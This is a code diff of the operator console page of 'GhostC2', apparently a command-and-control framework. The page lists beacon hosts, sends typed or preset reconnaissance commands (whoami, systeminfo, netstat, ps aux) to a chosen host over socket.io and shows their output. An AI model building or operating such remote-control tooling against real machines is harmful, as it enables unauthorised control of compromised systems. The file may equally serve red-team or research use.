@@ -1,73 +1,151 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>GhostC2 Live Console</title>
+    <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
     <style>
         body {
-            background: #111;
+            background: #000;
             color: #0f0;
             font-family: monospace;
             padding: 20px;
         }
         #terminal {
-            background: #000;
-            border: 1px solid #0f0;
+            background: #111;
             padding: 10px;
             height: 300px;
-            overflow-y: scroll;
-            white-space: pre-wrap;
+            overflow-y: auto;
+            border: 1px solid #0f0;
+            margin-bottom: 10px;
         }
-        select, input, button {
-            background: #222;
+        #input {
+            width: 100%;
+            background: #000;
             color: #0f0;
             border: 1px solid #0f0;
-            font-family: monospace;
+            padding: 10px;
+        }
+        select, button {
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
             padding: 5px;
+            margin: 5px 5px 10px 0;
+        }
+        a {
+            color: #0f0;
+            text-decoration: underline;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        .console-cmd {
+            color: #0f0;
+            margin: 0;
+        }
+        .console-result {
+            color: #ccffcc;
+            margin: 0 0 12px 0;
         }
     </style>
 </head>
 <body>
-    <h1>👻 GhostC2 Live Console</h1>
-    <form id="command-form">
-        <label>Target Host:</label>
-        <select id="host">
-            {% for beacon in hosts %}
-            <option value="{{ beacon }}">{{ beacon }}</option>
-            {% endfor %}
-        </select><br><br>
-        <label>Command:</label>
-        <input type="text" id="cmd" required>
-        <button type="submit">Send</button>
-    </form>
+    <h2>Live Beacon Console</h2>
 
-    <pre id="terminal">[+] Console ready.
-</pre>
+    <a href="/">&larr; Back to Dashboard</a><br>
 
-    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <label for="hostSelect">Select Host:</label>
+    <select id="hostSelect"></select>
+
+    <label for="presetTasks">Quick Tasks:</label>
+    <select id="presetTasks">
+        <option value="">-- select --</option>
+        <optgroup label="Windows">
+            <option value="whoami">whoami</option>
+            <option value="ipconfig">ipconfig</option>
+            <option value="systeminfo">systeminfo</option>
+            <option value="netstat -ano">netstat -ano</option>
+            <option value="tasklist">tasklist</option>
+        </optgroup>
+        <optgroup label="Linux/macOS">
+            <option value="whoami">whoami</option>
+            <option value="ifconfig">ifconfig</option>
+            <option value="uname -a">uname -a</option>
+            <option value="ps aux">ps aux</option>
+            <option value="netstat -tulnp">netstat -tulnp</option>
+        </optgroup>
+    </select>
+    <button onclick="sendPreset()">Send</button>
+
+    <div id="terminal"></div>
+    <input id="input" placeholder="Enter command and press Enter">
+
     <script>
-        const terminal = document.getElementById("terminal");
-        const form = document.getElementById("command-form");
         const socket = io();
+        const input = document.getElementById('input');
+        const terminal = document.getElementById('terminal');
+        const hostSelect = document.getElementById('hostSelect');
+        const presetTasks = document.getElementById('presetTasks');
 
-        form.addEventListener("submit", async function (e) {
-            e.preventDefault();
-            const hostname = document.getElementById("host").value;
-            const command = document.getElementById("cmd").value;
+        if (!hostSelect) {
+            console.error("hostSelect dropdown not found.");
+        }
 
-            const res = await fetch("/console_send", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ hostname, command })
+        fetch('/console_data')
+            .then(res => res.json())
+            .then(data => {
+                console.log("Hosts fetched:", data.hosts);
+                data.hosts.forEach(h => {
+                    const opt = document.createElement('option');
+                    opt.value = opt.textContent = h;
+                    hostSelect.appendChild(opt);
+                });
+            })
+            .catch(err => {
+                console.error("Error fetching hosts:", err);
             });
 
-            terminal.innerText += `\n$ ${command}\n[+] Task sent to ${hostname}...\n`;
-            document.getElementById("cmd").value = "";
+        input.addEventListener('keydown', function (e) {
+            if (e.key === 'Enter') {
+                const command = input.value.trim();
+                const host = hostSelect.value;
+                if (!host || !command) return;
+                socket.emit('send_command', { hostname: host, command });
+
+                const cmdLine = document.createElement('pre');
+                cmdLine.textContent = `> ${command}`;
+                cmdLine.className = 'console-cmd';
+                terminal.appendChild(cmdLine);
+
+                input.value = '';
+            }
         });
 
-        socket.on("console_result", data => {
-            const { hostname, command, result } = data;
-            terminal.innerText += `\n[${hostname}] $ ${command}\n${result}\n`;
-            terminal.scrollTop = terminal.scrollHeight;
+        function sendPreset() {
+            const cmd = presetTasks.value;
+            if (!cmd) return;
+            input.value = cmd;
+            input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter' }));
+        }
+
+        socket.on('console_result', data => {
+            console.log("[console_result]", data);
+            const selectedHost = hostSelect.value;
+            if (data.hostname === selectedHost) {
+                const cmdLine = document.createElement('pre');
+                cmdLine.textContent = `$ ${data.command}`;
+                cmdLine.className = 'console-cmd';
+
+                const resultLine = document.createElement('pre');
+                resultLine.textContent = data.result;
+                resultLine.className = 'console-result';
+
+                terminal.appendChild(cmdLine);
+                terminal.appendChild(resultLine);
+                terminal.scrollTop = terminal.scrollHeight;
+            } else {
+                console.log(`[console_result] skipped — ${data.hostname} != ${selectedHost}`);
+            }
         });
     </script>
 </body>
